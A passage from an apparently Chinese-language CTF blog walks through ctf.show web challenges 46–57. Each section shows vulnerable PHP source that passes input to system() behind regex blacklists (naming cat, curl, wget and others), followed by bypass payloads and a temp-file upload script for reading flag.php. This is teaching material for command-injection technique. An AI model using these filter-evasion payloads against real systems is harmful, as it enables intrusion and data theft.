highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>把通配符 <code>*</code> 也过滤了，数字也过滤了，那就用 <code>?</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac%09fla?.php%0a<br>?c=tac%09????????%0a<br></code></pre></td></tr></table></figure><h1 id="Web-47"><a href="#Web-47" class="headerlink" title="Web 47"></a>Web 47</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 21:59:23<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>虽然过滤了一些和 <code>cat</code> 类似用法的命令，但是还能用 <code>tac/nl</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac%09????????%0a<br>?c=tac&lt;&gt;fla\g.php||<br>?c=tac&lt;&gt;fla&#x27;&#x27;g.php||<br>?c=nl&lt;&gt;fla&#x27;&#x27;g.php||<br>?c=nl&lt;fla&#x27;&#x27;g.php||<br></code></pre></td></tr></table></figure><h1 id="Web-48"><a href="#Web-48" class="headerlink" title="Web 48"></a>Web 48</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:06:20<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了一大堆，还是剩下了 <code>tac/nl</code>，payload 差不多</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac%09fl\ag.php||<br>?c=nl%09fl\ag.php||<br></code></pre></td></tr></table></figure><h1 id="Web-49"><a href="#Web-49" class="headerlink" title="Web 49"></a>Web 49</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:22:43<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>多过滤了 <code>%</code>，那么空格就用 <code>&lt;&gt;</code> 代替，截断用 <code>||</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac&lt;&gt;fl\ag.php||<br>?c=nl&lt;&gt;fl\ag.php||<br></code></pre></td></tr></table></figure><h1 id="Web-50"><a href="#Web-50" class="headerlink" title="Web 50"></a>Web 50</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:32:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>多过滤了 <code>x09 和 x26</code>，payload 还是一样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac&lt;&gt;fl\ag.php||<br></code></pre></td></tr></table></figure><h1 id="Web-51"><a href="#Web-51" class="headerlink" title="Web 51"></a>Web 51</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:42:52<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br></code></pre></td></tr></table></figure><p>这个把 <code>tac</code> 过滤了，但是还能用 <code>nl</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=nl&lt;&gt;fl\ag.php||<br></code></pre></td></tr></table></figure><h1 id="Web-52"><a href="#Web-52" class="headerlink" title="Web 52"></a>Web 52</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:50:30<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>把 <code>&lt;&gt;</code> 都过滤了，那就用 <code>$&#123;IFS&#125;</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=ca&#x27;&#x27;t$&#123;IFS&#125;/fl\ag||<br></code></pre></td></tr></table></figure><h1 id="Web-53"><a href="#Web-53" class="headerlink" title="Web 53"></a>Web 53</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 18:21:02<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        echo($c);<br>        $d = system($c);<br>        echo &quot;&lt;br&gt;&quot;.$d;<br>    &#125;else&#123;<br>        echo &#x27;no&#x27;;<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>payload 差不多</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=ca\t$&#123;IFS&#125;fla\g.php<br>?c=ca&#x27;&#x27;t$&#123;IFS&#125;fla&#x27;&#x27;g.php<br></code></pre></td></tr></table></figure><h1 id="Web-54"><a href="#Web-54" class="headerlink" title="Web 54"></a>Web 54</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&lt;?php<br><br>/*<br><span class="hljs-section"># -<span class="hljs-emphasis">*- coding: utf-8 -*</span>-</span><br><span class="hljs-section"># @Author: Lazzaro</span><br><span class="hljs-section"># @Date:   2020-09-05 20:49:30</span><br><span class="hljs-section"># @Last Modified by:   h1xa</span><br><span class="hljs-section"># @Last Modified time: 2020-09-07 19:43:42</span><br><span class="hljs-section"># @email: h1xa@ctfer.com</span><br><span class="hljs-section"># @link: https://ctfer.com</span><br><br><span class="hljs-emphasis">*/</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="hljs-emphasis">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="hljs-emphasis">    if(!preg_match(&quot;/\;|.*</span>c.<span class="hljs-emphasis">*a.*</span>t.<span class="hljs-emphasis">*|.*</span>f.<span class="hljs-emphasis">*l.*</span>a.<span class="hljs-emphasis">*g.*</span>| |[0-9]|\<span class="hljs-emphasis">*|.*</span>m.<span class="hljs-emphasis">*o.*</span>r.<span class="hljs-emphasis">*e.*</span>|.<span class="hljs-emphasis">*w.*</span>g.<span class="hljs-emphasis">*e.*</span>t.<span class="hljs-emphasis">*|.*</span>l.<span class="hljs-emphasis">*e.*</span>s.<span class="hljs-emphasis">*s.*</span>|.<span class="hljs-emphasis">*h.*</span>e.<span class="hljs-emphasis">*a.*</span>d.<span class="hljs-emphasis">*|.*</span>s.<span class="hljs-emphasis">*o.*</span>r.<span class="hljs-emphasis">*t.*</span>|.<span class="hljs-emphasis">*t.*</span>a.<span class="hljs-emphasis">*i.*</span>l.<span class="hljs-emphasis">*|.*</span>s.<span class="hljs-emphasis">*e.*</span>d.<span class="hljs-emphasis">*|.*</span>c.<span class="hljs-emphasis">*u.*</span>t.<span class="hljs-emphasis">*|.*</span>t.<span class="hljs-emphasis">*a.*</span>c.<span class="hljs-emphasis">*|.*</span>a.<span class="hljs-emphasis">*w.*</span>k.<span class="hljs-emphasis">*|.*</span>s.<span class="hljs-emphasis">*t.*</span>r.<span class="hljs-emphasis">*i.*</span>n.<span class="hljs-emphasis">*g.*</span>s.<span class="hljs-emphasis">*|.*</span>o.<span class="hljs-emphasis">*d.*</span>|.<span class="hljs-emphasis">*c.*</span>u.<span class="hljs-emphasis">*r.*</span>l.<span class="hljs-emphasis">*|.*</span>n.<span class="hljs-emphasis">*l.*</span>|.<span class="hljs-emphasis">*s.*</span>c.<span class="hljs-emphasis">*p.*</span>|.<span class="hljs-emphasis">*r.*</span>m.<span class="hljs-emphasis">*|\`|\%|\x09|\x26|\&gt;|\<span class="language-xml">&lt;/i&quot;, $c))&#123;</span></span><br><span class="language-xml"><span class="hljs-emphasis">        system($c);</span></span><br><span class="language-xml"><span class="hljs-emphasis">    &#125;</span></span><br><span class="language-xml"><span class="hljs-emphasis">&#125;else&#123;</span></span><br><span class="language-xml"><span class="hljs-emphasis">    highlight_file(__FILE__);</span></span><br><span class="language-xml"><span class="hljs-emphasis">&#125;</span></span><br></code></pre></td></tr></table></figure><p>看到题目懵了一下，前面的那些方法已经不行了</p><ol><li><p>把文件复制到当前目录下，然后访问目录下载</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=cp$&#123;IFS&#125;f?ag.php$&#123;IFS&#125;./a<br>./a<br></code></pre></td></tr></table></figure></li><li><p>用通配符匹配 bin 目录下的 cat 或者 tac</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=/bin/ca?$&#123;IFS&#125;f?ag.php<br>?c=/bin/c??$IFS???????? <br></code></pre></td></tr></table></figure></li><li><p>用 <code>grep</code> 查找字符串</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=grep$&#123;IFS&#125;&#x27;fla&#x27;$&#123;IFS&#125;fla?.php<br></code></pre></td></tr></table></figure></li></ol><h1 id="Web-55"><a href="#Web-55" class="headerlink" title="Web 55"></a>Web 55</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 20:03:51<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// 你们在炫技吗？<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        system($c);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>又学到了，八进制绕过，将  <code>&#39;&#39;</code> 内的字符转为八进制绕过</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=$&#x27;cat&#x27; $&#x27;flag.php&#x27;<br>?c=$&#x27;\143\141\164&#x27; $&#x27;\146\154\141\147\56\160\150\160&#x27;<br></code></pre></td></tr></table></figure><h1 id="Web-56"><a href="#Web-56" class="headerlink" title="Web 56*"></a>Web 56*</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// 你们在炫技吗？<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        system($c);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>在 linux 下，<code>.</code> 可以用来执行 <code>.sh</code> 脚本，在 php 中，上传的文件保存在临时文件夹下，默认的文件名是 <code>/tmp/phpXXXXXX</code>，文件名最后 6 个字符是随机的大小写字母</p><p>执行 <code>/tmp/phpxxxxxx</code> 也会被过滤，那么必须要用通配符了，表示为 <code>/*/?????????</code> 或者 <code>/???/?????????</code>，但通配的文件不止一个，无法指定执行。但上传的 php 生成的临时文件包含大写字母，在 ASCII 表中，大写字母排列在 <code>@-[</code> 中，那么我们可以利用 <code>[@-[]</code> 来表示大写字母进行绕过</p><p>看看 p 神的文章， <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">import requests<br><br>while True:<br>    url = &quot;http://2b507c86-6191-49f9-92f3-7f75368716d1.challenge.ctf.show/?c=.+/???/????????[@-[]&quot;<br>    r = requests.post(url, files=&#123;&quot;file&quot;: (&#x27;1.php&#x27;, b&#x27;cat flag.php&#x27;)&#125;)<br>    if r.text.find(&quot;flag&quot;) &gt;0:<br>        print(r.text)<br>        break<br></code></pre></td></tr></table></figure><h1 id="Web-57"><a href="#Web-57" class="headerlink" title="Web 57*"></a>Web 57*</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-08 01:02:56<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>// 还能炫的动吗？<br>//flag in 36.php<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;<br>        system(&quot;cat &quot;.$c.&quot;.php&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>flag 在 36.php，构造 36，但是数字被禁了</p><p>hint ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))<br><span class="hljs-variable">$&#123;_&#125;</span> =<span class="hljs-string">&quot;&quot;</span> //返回上一次命令<br>$((<span class="hljs-variable">$&#123;_&#125;</span>))=0<br>$((~$((<span class="hljs-variable">$&#123;_&#125;</span>))))=-1<br></code></pre></td></tr></table></figure><p>因为 shell 编程中的 <code>Shell (())</code>  命令中，可以发现 <code>echo $(())</code> 输出的是 0，那么取反输出则是 -1，以此类推，把结果加到 -37 再取反就能得到 36</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# <span class="hljs-built_in">echo</span> $((~<span class="hljs-number">36</span>))<br>-37<br>└─# <span class="hljs-built_in">echo</span> $((~$((-<span class="hljs-number">37</span>))))<br>36<br></code></pre></td></tr></table></figure><p>我用的笨方法，一直加加加</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs erlang">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# echo <span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>())))<br>-1<br><br>┌──<span class="hljs-params">(root㉿butt3rf1y)</span>-[/home/butt3rf1y]<br>└─# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))<br>-2<br><br>┌──<span class="hljs-params">(root㉿butt3rf1y)</span>-[/home/butt3rf1y]<br>└─# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))))<br>-4<br><br>┌──<span class="hljs-params">(root㉿butt3rf1y)</span>-[/home/butt3rf1y]<br>└─# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))))))<br>-8<br><br>┌──<span class="hljs-params">(root㉿butt3rf1y)</span>-[/home/butt3rf1y]<br>└─# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span 